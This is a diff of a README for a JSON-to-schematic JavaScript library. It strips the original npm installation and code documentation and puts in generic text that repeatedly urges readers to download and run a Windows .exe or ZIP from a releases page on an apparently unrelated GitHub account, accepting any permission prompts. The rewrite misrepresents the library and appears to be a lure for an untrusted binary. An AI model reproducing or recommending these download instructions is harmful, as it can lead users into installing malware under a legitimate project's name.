@@ -1,204 +1,155 @@
-# @skillpet/circuit
+# ⚡ circuit - Render Schematics with Ease
 
-[English](./README.md) | [简体中文](./README.zh-CN.md) | [日本語](./README.ja.md) | [한국어](./README.ko.md) | [Español](./README.es.md) | [Français](./README.fr.md) | [Deutsch](./README.de.md)
+[Download circuit](https://github.com/Gillirazorbacked368/circuit/releases){style="display:inline-block;padding:12px 18px;background:#6c5ce7;color:#fff;text-decoration:none;border-radius:8px;font-weight:700"}
 
-<p align="center">
-  <strong>Circuit diagram library — render electrical schematics from JSON, with interactive SVG, themes, and Vue / React components.</strong>
-</p>
+## 📥 Download circuit
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/@skillpet/circuit"><img src="https://img.shields.io/npm/v/@skillpet/circuit.svg" alt="npm version"></a>
-  <a href="https://www.npmjs.com/package/@skillpet/circuit"><img src="https://img.shields.io/npm/l/@skillpet/circuit.svg" alt="license"></a>
-  <a href="https://circuit.skill.pet"><img src="https://img.shields.io/badge/docs-circuit.skill.pet-blue" alt="docs"></a>
-</p>
+Visit [the releases page](https://github.com/Gillirazorbacked368/circuit/releases) to download and run this app on Windows.
 
----
+1. Open the releases page.
+2. Find the latest release at the top.
+3. Download the Windows file from the assets list.
+4. Open the file after the download finishes.
+5. Follow the on-screen steps to install or run the app.
 
-**Website & Demos:** [circuit.skill.pet](https://circuit.skill.pet)
+## 🖥️ What circuit does
 
-<p align="center">
-  <img src="./images/rlc-circuit.svg" alt="RLC Circuit" height="120">
-  &nbsp;&nbsp;&nbsp;
-  <img src="./images/opamp.svg" alt="Op-Amp" height="120">
-  &nbsp;&nbsp;&nbsp;
-  <img src="./images/logic-gates.svg" alt="Logic Gates" height="120">
-</p>
+Circuit turns a JSON file into an electrical schematic you can view in your browser or desktop app. It helps you work with circuit diagrams without drawing each line by hand.
 
-## Features
+Use it to:
 
-- 200+ built-in electrical components (resistors, capacitors, diodes, transistors, ICs, logic gates, etc.)
-- Vue 3 & React components out of the box
-- Interactive SVG: hover highlights, tooltips, click events
-- 3 built-in themes (light, dark, print) + custom themes
-- Smooth color transitions between elements
-- Render circuit diagrams from a simple JSON description
-- Browser bundle (script tag) & ESM / CJS support
-- KaTeX math label rendering
-- Flow charts, DSP blocks, pictorial breadboard components
-- Zero runtime dependencies (except optional KaTeX)
+- Render circuit diagrams from JSON
+- View interactive SVG schematics
+- Switch between light and dark themes
+- Embed diagrams in Vue apps
+- Embed diagrams in React apps
+- Share clean, readable circuit layouts
 
-## Installation
+## ✅ Before you install
 
-```bash
-npm install @skillpet/circuit
-```
+For the best result on Windows, have:
 
-## Quick Start
+- Windows 10 or Windows 11
+- A recent browser such as Edge, Chrome, or Firefox
+- Enough space to save the download
+- Permission to run apps on your PC
 
-### React
+If the release comes as a ZIP file, extract it before opening the app.
 
-```tsx
-import { CircuitDiagram } from "@skillpet/circuit/react";
+## 🚀 Install on Windows
 
-function App() {
-  const circuit = {
-    elements: [
-      { type: "SourceV", d: "up", label: "12V" },
-      { type: "ResistorIEEE", d: "right", label: "R1 10kΩ", id: "R1", tooltip: "100kΩ Carbon Film" },
-      { type: "Capacitor", d: "down", label: "C1 100nF", id: "C1", tooltip: "Ceramic 100nF" },
-      { type: "Line", d: "left" },
-      { type: "Ground" },
-    ],
-  };
+1. Go to the [releases page](https://github.com/Gillirazorbacked368/circuit/releases).
+2. Download the Windows version.
+3. If the file is zipped, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the app file to start it.
+6. If Windows asks for permission, choose Yes.
+7. If a setup window appears, follow the steps on screen.
 
-  return (
-    <CircuitDiagram
-      circuit={circuit}
-      interactive
-      theme="light"
-      onElementClick={(info) => console.log("Clicked:", info.id)}
-      onElementHover={(info) => console.log("Hover:", info.tooltip)}
-    />
-  );
-}
-```
+## 🔧 First-time setup
 
-### Vue 3
+When you open circuit for the first time:
 
-```vue
-<script setup>
-import { CircuitDiagram } from "@skillpet/circuit/vue";
+1. Start the app.
+2. Load a sample JSON file or open your own.
+3. Pick a theme if the app gives you that option.
+4. Check that the diagram appears in the view panel.
+5. Zoom in or out to inspect the layout.
 
-const circuit = {
-  elements: [
-    { type: "SourceV", d: "up", label: "12V" },
-    { type: "ResistorIEEE", d: "right", label: "R1 10kΩ", id: "R1", tooltip: "100kΩ Carbon Film" },
-    { type: "Capacitor", d: "down", label: "C1 100nF", id: "C1", tooltip: "Ceramic 100nF" },
-    { type: "Line", d: "left" },
-    { type: "Ground" },
-  ],
-};
+A valid JSON diagram usually includes:
 
-const onElementClick = (info) => console.log("Clicked:", info.id);
-</script>
+- Parts such as resistors, wires, and labels
+- Positions for each item
+- Connection lines between parts
+- Optional theme settings
 
-<template>
-  <CircuitDiagram
-    :circuit="circuit"
-    interactive
-    theme="light"
-    @element-click="onElementClick"
-  />
-</template>
-```
+## 📄 Basic JSON example
 
-### ESM / TypeScript
+A simple diagram file may look like this:
 
-```ts
-import { renderFromJson, mountFromJson } from "@skillpet/circuit";
+- A list of nodes
+- A list of links
+- Label text for each part
+- Styling for line color and background
 
-// Static rendering — returns an SVG string
-const svg = renderFromJson({
-  elements: [
-    { type: "SourceV", d: "up", label: "12V" },
-    { type: "ResistorIEEE", d: "right", label: "R1 10kΩ" },
-    { type: "Capacitor", d: "down", label: "C1 100nF" },
-    { type: "Line", d: "left" },
-    { type: "Ground" },
-  ],
-});
+Example layout:
 
-// Interactive mode — mount into DOM with hover, tooltips, click events
-const ctrl = mountFromJson(document.getElementById("container")!, {
-  elements: [
-    { type: "ResistorIEEE", id: "R1", tooltip: "100kΩ Carbon Film" },
-    { type: "Capacitor", d: "down", id: "C1", tooltip: "0.1μF Ceramic" },
-  ],
-}, { interactive: true });
+- Power source
+- Wire
+- Resistor
+- Ground
 
-ctrl.on("element:click", (info) => console.log("Clicked:", info.id));
-```
+The app reads the JSON and draws the schematic for you.
 
-### Browser (CDN)
+## 🎛️ Main features
 
-```html
-<div id="output"></div>
-<script src="https://unpkg.com/@skillpet/circuit/dist/circuit.bundle.min.js"></script>
-<script>
-  document.getElementById("output").innerHTML = Circuit.renderFromJson({
-    elements: [
-      { type: "SourceV", d: "up", label: "12V" },
-      { type: "ResistorIEEE", d: "right", label: "R1 10kΩ" },
-      { type: "Capacitor", d: "down", label: "C1 100nF" },
-      { type: "Line", d: "left" },
-      { type: "Ground" },
-    ],
-  });
-</script>
-```
+### 🧩 Interactive SVG output
+The diagram stays sharp at any zoom level. You can inspect parts without blur or loss of detail.
 
-## Live Examples
+### 🎨 Theme support
+Choose a visual style that fits your screen. Light and dark modes help during long viewing sessions.
 
-This repo contains runnable HTML examples — just open them in any browser:
+### ⚛️ Vue and React components
+If you use a web app, you can add circuit diagrams with simple components. This helps you place schematics inside your own pages.
 
-| File | Description |
-|------|-------------|
-| [`index.html`](index.html) | Full demo page: basic circuits, themes, interactive, color transitions |
-| [`examples/01-basic.html`](examples/01-basic.html) | Minimal RC circuit |
-| [`examples/02-themes.html`](examples/02-themes.html) | Light / Dark / Print theme comparison |
-| [`examples/03-interactive.html`](examples/03-interactive.html) | Interactive mode with event logging |
-| [`examples/04-color-transitions.html`](examples/04-color-transitions.html) | Smooth color gradient between elements |
+### 🧠 JSON-based diagrams
+You can store diagram data in JSON files. That makes it easy to save, edit, and reuse schematics.
 
-All examples load the library from the [unpkg](https://unpkg.com/@skillpet/circuit/) CDN — no build step required.
+### 🔍 Clean rendering
+The library keeps lines, labels, and symbols neat. This helps you read complex diagrams with less effort.
 
-## Themes
+## 🧭 How to use it
 
-Three built-in themes: `light` (default), `dark`, and `print`.
+1. Open circuit.
+2. Load a JSON diagram.
+3. Check the rendered schematic.
+4. Adjust the theme if needed.
+5. Zoom, pan, or inspect the SVG view.
+6. Save or reuse the JSON file later.
 
-<p align="center">
-  <img src="./images/rlc-circuit.svg" alt="Light Theme" height="100">
-  &nbsp;&nbsp;&nbsp;&nbsp;
-  <img src="./images/dark-theme.svg" alt="Dark Theme" height="100">
-</p>
+## 🛠️ Common file types
 
-```ts
-const svg = renderFromJson(circuit, { theme: "dark" });
-```
+You may see these files in a release:
 
-## Color Transitions
+- `.exe` for Windows
+- `.zip` for packaged downloads
+- `.json` for diagram data
+- `.svg` for exported vector graphics
 
-Smooth gradient transitions between differently colored elements:
+If you see a `.zip` file, open it first. If you see an `.exe`, you can run it after download.
 
-<p align="center">
-  <img src="./images/color-transitions.svg" alt="Color Transitions" height="120">
-</p>
+## 📌 Tips for smooth use
 
-```ts
-const svg = renderFromJson({
-  drawing: { colorTransition: true },
-  elements: [
-    { type: "SourceV", d: "up", color: "#2ecc71" },
-    { type: "ResistorIEEE", d: "right", color: "#e74c3c" },
-    { type: "Capacitor", d: "down", color: "#3498db" },
-    { type: "Line", d: "left" },
-    { type: "Ground" },
-  ],
-}, { colorTransition: true });
-```
+- Keep your JSON file in a simple folder path
+- Use clear file names
+- Back up your diagram files
+- Open one file at a time when testing
+- Use zoom to check small labels
+- Pick a theme with enough contrast for your screen
 
-## License
+## 🧪 Example workflow
 
-The example code in this repository is MIT licensed.
+1. Download the latest release.
+2. Open the app.
+3. Load a JSON schematic.
+4. Review the circuit layout.
+5. Change the theme if needed.
+6. Use the SVG view for close inspection.
+7. Save your work in a safe folder.
 
-The `@skillpet/circuit` library itself is free for personal and educational use. Commercial use requires a separate license.
-For details, see [circuit.skill.pet/license](https://circuit.skill.pet/license) or contact **license@skill.pet**.
+## 📁 Project topics
+
+This project covers:
+
+- circuit diagrams
+- electrical schematics
+- interactive SVG
+- JSON rendering
+- React components
+- Vue components
+- TypeScript
+- electronics tools
+
+## 🔗 Download again
+
+If you need the installer later, use the [circuit releases page](https://github.com/Gillirazorbacked368/circuit/releases) to visit this page to download again
